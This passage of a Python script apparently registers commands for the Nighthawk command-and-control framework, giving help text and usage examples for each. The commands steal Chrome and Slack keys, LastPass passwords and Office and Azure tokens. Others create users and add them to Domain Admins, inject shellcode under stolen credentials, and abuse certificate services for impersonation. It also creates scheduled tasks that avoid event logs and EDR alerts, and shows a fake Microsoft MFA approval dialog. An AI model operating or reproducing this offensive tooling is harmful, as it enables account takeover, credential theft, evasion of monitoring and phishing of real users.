    "You must have permission to open the process.",
    "Lists open handles in process",
    "ProcessListHandles <pid>",
    "ProcessListHandles 1234")

nighthawk.register_command(rcmd_ProcessDestroy, "ProcessDestroy",
    "Closes specified handle in a process, or all handles if not specified.\n"
    "HANDLEID must be between 1-65535.",
    "Closes handle(s) in a process",
    "ProcessDestroy <pid> [handleid]",
    "ProcessDestroy 1234 256")

nighthawk.register_command(rcmd_suspend, "suspend",
    "Attempts to suspend the specified process",
    "Suspend a process by PID",
    "suspend <pid>",
    "suspend 1234")

nighthawk.register_command(rcmd_resume, "resume",
    "Attempts to resume the specified process",
    "Resume a process by PID",
    "resume <pid>",
    "resume 1234")

# --- User Accounts ---

nighthawk.register_command(rcmd_enableuser, "enableuser",
    "Activates and enables the specified user account.\n"
    "Use \"\" for domain to target local machine.",
    "Enables and unlocks a user account",
    "enableuser <username> <domain>",
    "enableuser jsmith domain.local")

nighthawk.register_command(rcmd_setuserpass, "setuserpass",
    "Sets the password for the specified user account.\n"
    "Password must meet GPO requirements.\n"
    "Use \"\" for domain to target local machine.",
    "Sets a user's password",
    "setuserpass <username> <password> <domain>",
    "setuserpass jsmith P@ssw0rd! domain.local")

nighthawk.register_command(rcmd_addusertogroup, "addusertogroup",
    "Adds the specified user to a domain group.\n"
    "Use \"\" for server/domain to target local machine.",
    "Add a user to a group",
    "addusertogroup <username> <groupname> <server> <domain>",
    "addusertogroup jsmith \"Domain Admins\" dc01 domain.local")

nighthawk.register_command(rcmd_adduser, "adduser",
    "Adds a new user to a machine.\n"
    "If server is omitted, the local machine is used.",
    "Add a new user to a machine",
    "adduser <username> <password> [server]",
    "adduser newuser P@ssw0rd!")

nighthawk.register_command(rcmd_unexpireuser, "unexpireuser",
    "Activates and enables the specified user account (un-expire).\n"
    "Use \"\" for domain to target local machine.",
    "Un-expires a user account",
    "unexpireuser <username> <domain>",
    "unexpireuser jsmith domain.local")

# --- Credential / Key Extraction ---

nighthawk.register_command(rcmd_chromeKey, "chromeKey",
    "Decrypts the base64 encoded Chrome key for use in decrypting cookies.\n"
    "Feed the key and cookie file into Chlonium to decrypt contents.",
    "Decrypts the Chrome encryption key",
    "chromeKey", "chromeKey")

nighthawk.register_command(rcmd_slackKey, "slackKey",
    "Decrypts the base64 encoded Slack key for use in decrypting cookies.",
    "Decrypts the Slack encryption key",
    "slackKey", "slackKey")

nighthawk.register_command(rcmd_office_tokens, "office_tokens",
    "Searches memory of the specified process for Office JWT Access Tokens",
    "Searches memory for Office JWT tokens",
    "office_tokens <pid>",
    "office_tokens 1234")

nighthawk.register_command(rcmd_lastpass, "lastpass",
    "Searches memory for LastPass passwords and hashes.\n"
    "Provide one or more PIDs of LastPass processes.",
    "Searches memory for LastPass passwords",
    "lastpass <pid1> [pid2] [pid3] ...",
    "lastpass 1234 5678")

nighthawk.register_command(rcmd_slack_cookie, "slack_cookie",
    "Searches memory of the specified process for Slack tokens",
    "Searches memory for Slack tokens",
    "slack_cookie <pid>",
    "slack_cookie 1234")

# --- Shellcode / Impersonation ---

nighthawk.register_command(rcmd_shspawnas, "shspawnas",
    "Spawn and inject as specified user.\n"
    "Use \"\" for domain to log into local machine.\n"
    "The user must be able to log in interactively (login is recorded).",
    "Spawn / inject as specified user",
    "shspawnas <domain> <username> <password> <shellcode_file>",
    "shspawnas domain.local jsmith P@ssw0rd! C:\\sc.bin")

# --- ADCS ---

nighthawk.register_command(rcmd_adcs_request, "adcs_request",
    "Request an enrollment certificate from a CA.\n"
    "All arguments are positional — specify \"\" for defaults.\n"
    "  INSTALL: 0=No, 1=Yes. MACHINE: 0=No, 1=Yes.\n"
    "  ADD_APP_POLICY: adds client auth extension (ESC15). DNS: 1=DNS name SAN.",
    "Request an enrollment certificate",
    "adcs_request <CA> [template] [subject] [altname] [alturl] [install] [machine] [app_policy] [dns]",
    "adcs_request cert.example.org\\\\example-CERT-CA")

nighthawk.register_command(rcmd_adcs_request_on_behalf, "adcs_request_on_behalf",
    "Request a certificate on behalf of another user using an enrollment agent cert.\n"
    "The PFX file must have the OID_ENROLLMENT_AGENT extension.",
    "Request certificate on behalf of another user",
    "adcs_request_on_behalf <template> <requester> <pfx_path> <download_name>",
    "adcs_request_on_behalf User Example\\\\Administrator C:\\enroll.pfx Admin.pfx")

nighthawk.register_command(rcmd_make_token_cert, "make_token_cert",
    "Applies an impersonation token based on the Alt Name in a supplied .pfx file.\n"
    "Installs cert to current user store, creates impersonation token, then deletes cert.",
    "Impersonate via certificate",
    "make_token_cert <pfx_path> [pfx_password]",
    "make_token_cert C:\\admin.pfx MyPassword")

# --- Privilege / Misc ---

nighthawk.register_command(rcmd_get_priv, "get_priv",
    "Activates a token privilege.\n"
    "Privilege names: SeDebugPrivilege, SeBackupPrivilege, etc.\n"
    "See: https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants",
    "Activate a token privilege",
    "get_priv <privilege_name>",
    "get_priv SeDebugPrivilege")

nighthawk.register_command(rcmd_ghost_task, "ghost_task",
    "Create or delete a scheduled task via registry without triggering Event 4698/106.\n"
    "  SCHEDULETYPE: second, daily, weekly, logon\n"
    "  For weekly: specify TIME and DAY (e.g. monday,thursday)\n"
    "  Requires SYSTEM privileges. Reboot needed to load task.\n"
    "Note: No MDE alert is generated.",
    "Create ghost scheduled task (no event log)",
    "ghost_task <host> <add|delete> <task> [program] [argument] [user] [schedule] [time] [day]",
    "ghost_task localhost add demo cmd.exe \"/c notepad.exe\" LAB\\\\Administrator daily 14:12")

nighthawk.register_command(rcmd_shutdown, "shutdown",
    "Shutdown or reboot a local or remote system.\n"
    "  Use \"\" for hostname to target localhost.\n"
    "  Use \"\" for no message.\n"
    "  TIME: seconds before shutdown (0=immediate, non-zero prompts user)\n"
    "  CLOSEAPPS: 0=let user save, 1=force close\n"
    "  REBOOT: 0=shutdown, 1=reboot",
    "Shutdown or reboot a system",
    "shutdown <hostname> <message> <time> <closeapps> <reboot>",
    "shutdown \"\" \"\" 0 1 1")

nighthawk.register_command(rcmd_global_unprotect, "global_unprotect",
    "Attempts to find, decrypt, and download Global Protect VPN profiles and HIP settings",
    "Decrypt GlobalProtect VPN profiles",
    "global_unprotect", "global_unprotect")

nighthawk.register_command(rcmd_get_azure_token, "get_azure_token",
    "Perform OAuth code grant against Azure and print returned tokens.\n"
    "  CLIENT_ID must have consent in the tenant and accept http://localhost redirect.\n"
    "  BROWSER: 0=edge, 1=chrome, 2=default, 3=other\n"
    "  HINT: email of user to auth as (must have saved login)\n"
    "  BROWSER_PATH: full path to browser exe if non-standard",
    "Get Azure OAuth token via browser",
    "get_azure_token <client_id> <scope> <browser> [hint] [browser_path]",
    "get_azure_token 1950a258-227b-4e31-a9cf-717495945fc2 \"offline_access openid\" 2 user@domain.com")

nighthawk.register_command(rcmd_ask_mfa, "ask_mfa",
    "Displays a fake Microsoft Authenticator approval dialog with the specified number.\n"
    "Dialog auto-closes after 30 seconds or when user closes it.",
    "Displays a fake MFA approval dialog",
    "ask_mfa <number>",
    "ask_mfa 42")
